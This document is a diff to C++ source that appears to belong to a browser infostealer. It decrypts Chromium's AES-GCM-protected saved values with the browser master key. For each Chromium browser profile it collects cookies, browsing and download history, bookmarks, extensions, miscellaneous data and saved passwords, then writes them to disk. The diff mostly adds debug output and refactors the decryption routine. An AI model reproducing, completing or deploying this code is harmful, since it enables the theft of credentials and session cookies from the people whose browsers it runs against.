@@ -70,16 +70,18 @@ namespace global
 }
 std::string decrypt_val(const std::string& key, const std::string& val) {
     try {
-        std::vector<unsigned char> iv(val.begin() + 3, val.begin() + 15);
-        std::vector<unsigned char> encryptedPass(val.begin() + 15, val.end() - 16);
+        std::cout << val << std::endl;
+        std::string_view valView(val);
+        std::vector<unsigned char> iv(valView.substr(3, 12).begin(), valView.substr(3, 12).end());
+        std::vector<unsigned char> encryptedPass(valView.substr(15, val.size() - 31).begin(), valView.substr(15, val.size() - 31).end());
         std::vector<unsigned char> decryptPass(val.size());
-        EVP_CIPHER_CTX *ctx;
+        EVP_CIPHER_CTX* ctx;
         int len, plaintext;
 
         ctx = EVP_CIPHER_CTX_new();
-        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
-        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), NULL);
-        EVP_DecryptInit_ex(ctx, NULL, NULL, (unsigned char*) key.c_str(), iv.data());
+        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr);
+        EVP_DecryptInit_ex(ctx, nullptr, nullptr, reinterpret_cast<const unsigned char*>(key.c_str()), iv.data());
         EVP_DecryptUpdate(ctx, decryptPass.data(), &len, encryptedPass.data(), static_cast<int>(encryptedPass.size()));
         plaintext = len;
         EVP_DecryptFinal_ex(ctx, decryptPass.data() + len, &len);
@@ -89,7 +91,8 @@ std::string decrypt_val(const std::string& key, const std::string& val) {
 
         std::string decryptedPass(clean.begin(), clean.end());
         return decryptedPass;
-    } catch (...) {
+    }
+    catch (...) {
         return "Chrome < 80";
     }
 }
@@ -542,7 +545,7 @@ std::vector<ExtensionInfo> grab_ext(const std::string& path, std::string profile
     }
     closedir(dir);
   } else {
-    return {};
+      return {};
   }
   return extension_info_list;
 }
@@ -726,13 +729,21 @@ void browsers::Chromium()
                 {
                     std::string dir = global::defaultPath + global::names[i];
                     int result = _mkdir(dir.c_str());
+                    std::cout << "grab_cookies" << std::endl;
                     std::string cookies = grab_cookies(browsersPaths[i], mk, profiles[j]);
+                    std::cout << "grab_his" << std::endl;
                     std::string history = grab_history(browsersPaths[i], profiles[j]);
+                    std::cout << "grab_dhis" << std::endl;
                     std::string downhistory = grab_downhistory(browsersPaths[i], profiles[j]);
+                    std::cout << "grab_book" << std::endl;
                     std::string bookmarks = grab_bookmarks(browsersPaths[i], profiles[j]);
+                    std::cout << "grab_ext" << std::endl;
                     std::vector<ExtensionInfo> extensions = grab_ext(browsersPaths[i], profiles[j]);
+                    std::cout << "grab_misc" << std::endl;
                     std::string misc = grab_misc(browsersPaths[i], mk, profiles[j]);
+                    std::cout << "grab_pwd" << std::endl;
                     std::string pwds = grab_passwords(browsersPaths[i], mk, profiles[j]);
+                    std::cout << "grab_write" << std::endl;
                     WriteAll(global::names[i], profiles[j], cookies, history, downhistory, bookmarks, extensions, misc, pwds);
 
                 }
